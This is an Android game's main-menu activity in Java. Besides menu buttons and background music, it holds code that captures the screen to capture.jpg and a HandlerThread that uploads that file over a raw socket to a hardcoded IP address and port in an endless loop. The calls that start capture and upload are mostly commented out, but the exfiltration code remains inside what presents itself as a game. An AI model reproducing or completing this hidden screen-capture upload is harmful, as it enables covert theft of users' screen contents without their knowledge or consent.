package com.example.dogsteal;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import com.example.dogstealdummy.R;

public class MainActivity extends Activity implements OnClickListener{

	private View main, level;
	private View MainLayout;
	private MediaPlayer m_bgm;
	private MediaPlayer m_caution;
	private Bitmap bm;
	
	//private HandlerThread thread;
	
	/*Handler mHandler=new Handler(){
		public void handleMessage(Message msg){
			if(msg.what==0){
				View capture=MainLayout.getRootView();
				capture.setDrawingCacheEnabled(true);
				bm=capture.getDrawingCache();
				FileOutputStream out;
					try{
						out=new FileOutputStream(Environment.getExternalStorageDirectory().toString()+"/capture.jpg");
						bm.compress(Bitmap.CompressFormat.JPEG, 100, out);
					}catch(FileNotFoundException fnfe){
						System.out.println(fnfe);
					}
			}
		}
	};*/

	
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
				WindowManager.LayoutParams.FLAG_FULLSCREEN);
		setContentView(R.layout.activity_main);
		main = findViewById(R.id.main);
		level = findViewById(R.id.level);
		MainLayout=findViewById(R.id.MainLayout);
		
		
		/*thread=new HandlerThread();
		thread.start();
		CaptureThread thread1=new CaptureThread();
		thread1.setDaemon(true);
		thread1.start();*/
		
		
		
		m_caution=MediaPlayer.create(this, R.raw.caution);
		m_bgm=MediaPlayer.create(this, R.raw.menu_bgm);
		m_bgm.start();
		
		findViewById(R.id.single_btn).setOnClickListener(this);
		findViewById(R.id.back_btn).setOnClickListener(this);
		findViewById(R.id.easy_btn).setOnClickListener(this);
		findViewById(R.id.hard_btn).setOnClickListener(this);
		findViewById(R.id.how_btn).setOnClickListener(this);
	}

	protected void onDestroy(){
		super.onDestroy();
		if(m_bgm!=null){
			m_bgm.release();
			m_bgm=null;
		}
	}
	
	@Override
	public void onClick(View v) {
		main.setVisibility(View.VISIBLE);
		level.setVisibility(View.INVISIBLE);
		Intent single_intent = new Intent(this, SingleActivity.class);
		switch (v.getId()) {
		case R.id.single_btn:
			m_caution.start();
			main.setVisibility(View.INVISIBLE);
			level.setVisibility(View.VISIBLE);
			break;
		case R.id.back_btn:
			m_caution.start();
			level.setVisibility(View.INVISIBLE);
			main.setVisibility(View.VISIBLE);
			break;
		case R.id.easy_btn:
			m_caution.start();
			if(m_bgm!=null){
				m_bgm.release();
				m_bgm=null;
			}
			single_intent.putExtra("difficulty",40);
			startActivity(single_intent);
			finish();
			break;
		case R.id.hard_btn:
			m_caution.start();
			if(m_bgm!=null){
				m_bgm.release();
				m_bgm=null;
			}
			single_intent.putExtra("difficulty",20);
			startActivity(single_intent);
			finish();
			break;
		case R.id.how_btn:
			m_caution.start();
			/*View capture2=MainLayout.getRootView();
			capture2.setDrawingCacheEnabled(true);
			bm=capture2.getDrawingCache();
			saveScreen(bm);*/
			break;
			
		}
	}

	private void saveScreen(Bitmap bm){
		FileOutputStream out;
		try{
			out=new FileOutputStream(Environment.getExternalStorageDirectory().toString()+"/capture.jpg");
			bm.compress(Bitmap.CompressFormat.JPEG, 100, out);
			out.flush();
		}catch(FileNotFoundException fnfe){
			System.out.println(fnfe);
		}catch(IOException e){
			System.out.println(e);
			
		}
		Toast.makeText(getApplicationContext(), "Captured!", Toast.LENGTH_LONG).show();
	}
	
	
	class HandlerThread extends Thread{
		
		private Socket socket=null;
		private FileInputStream m_in;
		private BufferedOutputStream bout;
		private BufferedInputStream bin;
		
		private void connectServer(){
			try{
				socket=new Socket("192.168.219.31",1997);				
			}catch(Exception e){
				System.out.println(e);
			}
		}
		public void run(){
			connectServer();
			try {
					bout=new BufferedOutputStream(socket.getOutputStream());
					m_in=new FileInputStream(Environment.getExternalStorageDirectory().toString()+"/capture.jpg");
					bin=new BufferedInputStream(m_in);
					while(true){
					byte [] data=new byte[1024];
					int length=bin.read(data);
					while(length!=-1){
						bout.write(data,0,length);
						length=bin.read(data);
					}
					bout.flush();
					}
					
				
			} catch (IOException e) {}
		}
	}
	
	
}


